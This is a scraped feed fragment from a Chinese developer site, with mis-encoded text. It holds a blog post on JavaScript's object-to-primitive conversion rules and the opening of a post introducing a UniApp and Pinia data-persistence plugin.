content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æˆ‘çš„å†™æ³•æœ‰ç‚¹æ½®"/> <meta itemprop="url" content="https://juejin.cn/user/1643143620204234"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JSä¸­å¯¹è±¡æ˜¯æ€ä¹ˆè¿ç®—çš„å‘¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1643143620204234/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æˆ‘çš„å†™æ³•æœ‰ç‚¹æ½®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:56:31.000Z" title="Thu Jan 08 2026 07:56:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript å¯¹è±¡è½¬åŸºæœ¬ç±»å‹çš„éšå¼è§„åˆ™ï¼Œä¸€æ¬¡è®²æ¸…</h2>
<p>åœ¨ JavaScript ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä¸€äº›**â€œçœ‹èµ·æ¥ä¸åˆç†ï¼Œä½†å®é™…ä¸Šå®Œå…¨ç¬¦åˆè§„èŒƒâ€**çš„è¡Œä¸ºï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">{} + 1
<span class="hljs-section">[]</span> == 0
<span class="hljs-attr">obj</span> == <span class="hljs-number">1</span>
</code></pre>
<p>è¿™äº›ç°è±¡çš„èƒŒåï¼Œéƒ½ç»•ä¸å¼€ä¸€ä¸ªæ ¸å¿ƒæœºåˆ¶ï¼š</p>
<blockquote>
<p><strong>å¯¹è±¡åœ¨å‚ä¸è¿ç®—æˆ–æ¯”è¾ƒæ—¶ï¼Œå¿…é¡»å…ˆè¢«è½¬æ¢ä¸ºåŸºæœ¬ç±»å‹å€¼ï¼ˆPrimitiveï¼‰</strong></p>
</blockquote>
<p>è€Œè¿™ä¸ªè½¬æ¢è¿‡ç¨‹ï¼Œå¹¶ä¸æ˜¯éšæ„çš„ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸€ã€å¯¹è±¡å¦‚ä½•è¢«è½¬æ¢æˆåŸºæœ¬ç±»å‹ï¼Ÿ</h3>
<p>å½“ JavaScript éœ€è¦æŠŠä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆåŸºæœ¬ç±»å‹æ—¶ï¼Œä¼šæŒ‰<strong>å›ºå®šé¡ºåº</strong>å°è¯•è°ƒç”¨å¯¹è±¡ä¸Šçš„ä¸‰ä¸ªæ–¹æ³•ï¼š</p>
<ol>
<li><code>@@toPrimitive</code>ï¼ˆä¹Ÿå°±æ˜¯ <code>Symbol.toPrimitive</code>ï¼‰</li>
<li><code>valueOf</code></li>
<li><code>toString</code></li>
</ol>
<h4 data-id="heading-2">åŸºæœ¬æµç¨‹å¯ä»¥æ€»ç»“ä¸ºï¼š</h4>
<blockquote>
<p><strong>è°å…ˆè¿”å›â€œåŸºæœ¬ç±»å‹â€ï¼Œè°å°±èƒœå‡º</strong></p>
</blockquote>
<p>å¦‚æœæŸä¸ªæ–¹æ³•è¿”å›çš„ä¸æ˜¯åŸºæœ¬ç±»å‹ï¼ˆstring / number / boolean / symbol / bigint / null / undefinedï¼‰ï¼Œ<br/>
é‚£ä¹ˆ JS ä¼š<strong>å¿½ç•¥è¿™ä¸ªç»“æœï¼Œç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªæ–¹æ³•</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-3">äºŒã€å®Œæ•´çš„è½¬æ¢æ­¥éª¤ï¼ˆè§„èŒƒçº§ï¼‰</h3>
<p>å½“å¯¹è±¡éœ€è¦è¢«è½¬æ¢ä¸ºåŸºæœ¬ç±»å‹æ—¶ï¼ŒJavaScript ä¼šæŒ‰ä»¥ä¸‹é€»è¾‘æ‰§è¡Œï¼š</p>
<ol>
<li>
<p><strong>å¦‚æœå¯¹è±¡å­˜åœ¨ <code>Symbol.toPrimitive</code> æ–¹æ³•</strong></p>
<ul>
<li>è°ƒç”¨å®ƒ</li>
<li>å¦‚æœè¿”å›çš„æ˜¯åŸºæœ¬ç±»å‹ï¼Œç›´æ¥ä½¿ç”¨</li>
<li>å¦åˆ™æŠ›å‡º <code>TypeError</code></li>
</ul>
</li>
<li>
<p><strong>å¦åˆ™ï¼Œæ ¹æ®ç›®æ ‡ç±»å‹ï¼ˆPreferredTypeï¼‰å†³å®šè°ƒç”¨é¡ºåº</strong></p>
<ul>
<li>å…ˆå°è¯• <code>valueOf</code></li>
<li>å¦‚æœä¸æ˜¯åŸºæœ¬ç±»å‹ï¼Œå†å°è¯• <code>toString</code></li>
</ul>
</li>
<li>
<p><strong>å¦‚æœéƒ½æ²¡è¿”å›åŸºæœ¬ç±»å‹</strong></p>
<ul>
<li>æŠ›å‡º <code>TypeError</code></li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-4">ä¸‰ã€PreferredType æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>PreferredType å¯ä»¥ç†è§£ä¸ºï¼š</p>
<blockquote>
<p><strong>â€œå½“å‰ä¸Šä¸‹æ–‡æ›´å¸Œæœ›å¾—åˆ°ä»€ä¹ˆç±»å‹çš„å€¼â€</strong></p>
</blockquote>
<p>å®ƒç›´æ¥å½±å“ <code>valueOf</code> å’Œ <code>toString</code> çš„ä¼˜å…ˆçº§ã€‚</p>
<h4 data-id="heading-5">ä¸åŒåœºæ™¯ä¸‹çš„ PreferredType</h4>

























<table><thead><tr><th>åœºæ™¯</th><th>PreferredType</th><th>ä¼˜å…ˆé¡ºåº</th></tr></thead><tbody><tr><td>æ•°å­¦è¿ç®—ï¼ˆ<code>+ - * /</code>ï¼‰</td><td>Number</td><td>valueOf â†’ toString</td></tr><tr><td>æ˜¾å¼å­—ç¬¦ä¸²è½¬æ¢</td><td>String</td><td>toString â†’ valueOf</td></tr><tr><td><code>==</code> æ¯”è¾ƒ</td><td>Default</td><td>valueOf â†’ toString</td></tr></tbody></table>
<p>ğŸ“Œ <strong>æ³¨æ„</strong>ï¼šDefault å¹¶ä¸ç­‰äº Stringï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹å®ƒæ›´åå‘ Numberã€‚</p>
<hr/>
<h3 data-id="heading-6">å››ã€ä¸€ä¸ªå¯æ§é¡ºåºçš„ç¤ºä¾‹</h3>
<p>æ¥çœ‹ä¸€ä¸ªå…¸å‹ä¾‹å­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>

<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> i++
  },
  <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> i++
  },
  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toPrimitive</span>]() {
    <span class="hljs-keyword">return</span> i++
  }
}
</code></pre>
<h4 data-id="heading-7">åœºæ™¯ 1ï¼šéšå¼æ•°å€¼è½¬æ¢</h4>
<pre><code class="hljs">obj + 1
</code></pre>
<p>æ‰§è¡Œé¡ºåºï¼š</p>
<ol>
<li>è°ƒç”¨ <code>Symbol.toPrimitive</code></li>
<li>è¿”å› <code>0</code></li>
<li>è¡¨è¾¾å¼å˜æˆ <code>0 + 1</code></li>
</ol>
<p>ç»“æœæ˜¯ï¼š</p>
<pre><code class="hljs">1
</code></pre>
<hr/>
<h4 data-id="heading-8">åœºæ™¯ 2ï¼šåˆ é™¤ <code>Symbol.toPrimitive</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">delete</span> obj[<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toPrimitive</span>]
obj + <span class="hljs-number">1</span>
</code></pre>
<p>PreferredType æ˜¯ <code>Number</code>ï¼Œäºæ˜¯ï¼š</p>
<ol>
<li>è°ƒç”¨ <code>valueOf</code> â†’ è¿”å› <code>0</code></li>
<li>ä¸å†è°ƒç”¨ <code>toString</code></li>
</ol>
<hr/>
<h4 data-id="heading-9">åœºæ™¯ 3ï¼šå­—ç¬¦ä¸²ä¸Šä¸‹æ–‡</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">String</span>(obj)
</code></pre>
<p>PreferredType æ˜¯ <code>String</code>ï¼š</p>
<ol>
<li>å…ˆè°ƒç”¨ <code>toString</code></li>
<li>ä¸å…³å¿ƒ <code>valueOf</code></li>
</ol>
<hr/>
<h3 data-id="heading-10">äº”ã€å¯¹è±¡æ¯”è¾ƒæ—¶å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</h3>
<p>å½“ä½¿ç”¨ <code>==</code> è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå¦‚æœä¸¤ä¸ªæ“ä½œæ•°ç±»å‹ä¸åŒï¼ŒJS ä¼šå°è¯•è¿›è¡Œ<strong>ç±»å‹å¯¹é½</strong>ã€‚</p>
<h4 data-id="heading-11">æ ¸å¿ƒè§„åˆ™ä¹‹ä¸€ï¼š</h4>
<blockquote>
<p><strong>å¯¹è±¡åœ¨å‚ä¸ <code>==</code> æ¯”è¾ƒæ—¶ï¼Œä¸€å®šä¼šå…ˆè¢«è½¬æ¢ä¸ºåŸºæœ¬ç±»å‹</strong></p>
</blockquote>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">obj</span> == <span class="hljs-number">1</span>
</code></pre>
<p>å®é™…å‘ç”Ÿçš„æ˜¯ï¼š</p>
<ol>
<li><code>obj</code> â†’ è§¦å‘å¯¹è±¡è½¬åŸºæœ¬ç±»å‹</li>
<li>å¾—åˆ°ä¸€ä¸ª primitive</li>
<li>å†ä¸ <code>1</code> åšæ¯”è¾ƒ</li>
</ol>
<p>ğŸ“Œ æ‰€ä»¥å¾ˆå¤šâ€œå¥‡æ€ªçš„ç›¸ç­‰ç»“æœâ€ï¼Œæœ¬è´¨éƒ½æ˜¯<strong>éšå¼ç±»å‹è½¬æ¢çš„å‰¯ä½œç”¨</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-12">å…­ã€ä¸ºä»€ä¹ˆè®¾è®¡æˆè¿™æ ·ï¼Ÿ</h3>
<p>è¿™å¥—è§„åˆ™çš„ç›®æ ‡åªæœ‰ä¸€ä¸ªï¼š</p>
<blockquote>
<p><strong>è®©å¯¹è±¡åœ¨â€œå¿…é¡»å‚ä¸è¿ç®—â€çš„åœºæ™¯ä¸‹ï¼Œæœ‰æœºä¼šè¡¨è¾¾è‡ªå·±çš„å€¼è¯­ä¹‰</strong></p>
</blockquote>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>Date</code> æ›´åå‘å­—ç¬¦ä¸²</li>
<li><code>Number</code> åŒ…è£…å¯¹è±¡æ›´åå‘æ•°å€¼</li>
<li>è‡ªå®šä¹‰å¯¹è±¡å¯ä»¥é€šè¿‡ <code>Symbol.toPrimitive</code> ç²¾å‡†æ§åˆ¶è¡Œä¸º</li>
</ul>
<p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>() + <span class="hljs-number">1</span>
</code></pre>
<p>è¡¨ç°å¾—æ›´åƒå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè€Œä¸æ˜¯æ•°å­¦è¿ç®—ã€‚</p>
<hr/>
<h3 data-id="heading-13">ä¸ƒã€å®è·µå»ºè®®ï¼ˆéå¸¸é‡è¦ï¼‰</h3>
<h4 data-id="heading-14">âœ… èƒ½ä¸ç”¨éšå¼è½¬æ¢ï¼Œå°±ä¸ç”¨</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Number</span>(obj)
<span class="hljs-built_in">String</span>(obj)
</code></pre>
<h4 data-id="heading-15">âœ… è‡ªå®šä¹‰å¯¹è±¡æ—¶ï¼Œä¼˜å…ˆå®ç° <code>Symbol.toPrimitive</code></h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Symbol.toPrimitive]</span>(hint) {
  return <span class="hljs-attr">hint</span> === <span class="hljs-string">'string'</span> ? <span class="hljs-string">'xxx'</span> : <span class="hljs-number">123</span>
}
</code></pre>
<h4 data-id="heading-16">âŒ ä¸è¦ä¾èµ– <code>valueOf / toString</code> çš„â€œè°ƒç”¨é¡ºåºå‰¯ä½œç”¨â€</h4>
<p>é‚£æ˜¯ç»™è§„èŒƒå’Œå¼•æ“ç”¨çš„ï¼Œä¸æ˜¯ç»™ä¸šåŠ¡é€»è¾‘ç”¨çš„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UniApp + Pinia æ•°æ®æŒä¹…åŒ–]]></title>    <link>https://juejin.cn/post/7592555965792911366</link>    <guid>https://juejin.cn/post/7592555965792911366</guid>    <pubDate>2026-01-08T07:58:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592555965792911366" data-draft-id="7592789801708322857" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UniApp + Pinia æ•°æ®æŒä¹…åŒ–"/> <meta itemprop="keywords" content="å‰ç«¯,uni-app,æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-08T07:58:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€å£¶çº±"/> <meta itemprop="url" content="https://juejin.cn/user/897635786437944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UniApp + Pinia æ•°æ®æŒä¹…åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/897635786437944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€å£¶çº±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:58:25.000Z" title="Thu Jan 08 2026 07:58:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">UniApp + Pinia æ•°æ®æŒä¹…åŒ–ï¼šä¸€ä¸ªé«˜æ€§èƒ½çš„è¯»å†™åˆ†ç¦»æ–¹æ¡ˆ</h2>
<p>åœ¨ UniApp å¼€å‘ä¸­ï¼Œä½¿ç”¨ <strong>Pinia</strong> è¿›è¡ŒçŠ¶æ€ç®¡ç†å·²ç»éå¸¸æ™®åŠã€‚éšç€ App å¤æ‚åº¦å¢åŠ ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦æŠŠä¸€äº›å…³é”®æ•°æ®ï¼ˆå¦‚ Tokenã€ç”¨æˆ·ä¿¡æ¯ã€è®¾ç½®é¡¹ï¼‰å­˜å‚¨åœ¨æœ¬åœ°ï¼Œä»¥ä¾¿ä¸‹æ¬¡æ‰“å¼€ App æ—¶èƒ½ç›´æ¥æ¢å¤ã€‚</p>
<p>ä½†æ˜¯ï¼Œåœ¨ UniAppï¼ˆç‰¹åˆ«æ˜¯å°ç¨‹åºï¼‰ç¯å¢ƒä¸‹åšæŒä¹…åŒ–ï¼Œå¾€å¾€ä¼šé‡åˆ°å‡ ä¸ªæ£˜æ‰‹çš„é—®é¢˜ï¼š</p>
<ul>
<li><strong>å¯åŠ¨ä½“éªŒå·®</strong>ï¼šå¦‚æœå¼‚æ­¥è¯»å–æ•°æ®ï¼ŒApp å¯åŠ¨æ—¶ç•Œé¢ä¼šå…ˆæ˜¾ç¤ºâ€œåˆå§‹å€¼â€ï¼ˆæ¯”å¦‚ç©ºç™½æˆ–æœªç™»å½•çŠ¶æ€ï¼‰ï¼Œè¿‡å‡ ç™¾æ¯«ç§’åæ‰é—ªå˜ä¸ºâ€œçœŸå®æ•°æ®â€ã€‚</li>
<li><strong>æ“ä½œå¡é¡¿</strong>ï¼šå¦‚æœåœ¨ä¸»çº¿ç¨‹åŒæ­¥å†™å…¥å¤§é‡æ•°æ®ï¼Œç”¨æˆ·æ»‘åŠ¨é¡µé¢æ—¶å¯èƒ½ä¼šæ„Ÿè§‰åˆ°æ‰å¸§ã€‚</li>
<li><strong>æ•°æ®ç±»å‹é™åˆ¶</strong>ï¼š<code>JSON.stringify</code> åŸç”Ÿä¸æ”¯æŒ <code>Date</code>ã€<code>BigInt</code> ç­‰ç±»å‹ï¼Œå­˜è¿›å»å–å‡ºæ¥è¿˜å¾—æ‰‹åŠ¨è½¬æ¢ã€‚</li>
</ul>
<p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘å¼€å‘äº†ä¸€ä¸ªè½»é‡çº§çš„æ’ä»¶ï¼š<code>pinia-plugin-uni-persist-next</code>ã€‚å®ƒä¸“æ³¨äºè§£å†³ UniApp ç¯å¢ƒä¸‹çš„ç‰¹æ®Šåœºæ™¯ï¼Œæä¾›æ›´æµç•…çš„å¼€å‘ä½“éªŒã€‚</p>
<hr/>
<h3 data-id="heading-1">ğŸŒŸ æ ¸å¿ƒç‰¹æ€§</h3>
<p>è¿™ä¸ªæ’ä»¶çš„è®¾è®¡æ€è·¯ä¸»è¦å›´ç»•ç€ <strong>â€œæ€§èƒ½â€</strong> å’Œ <strong>â€œæ˜“ç”¨æ€§â€</strong> å±•å¼€ï¼š</p>
<ol>
<li>
<p><strong>âš¡ è¯»å†™åˆ†ç¦»ç­–ç•¥</strong></p>
<ul>
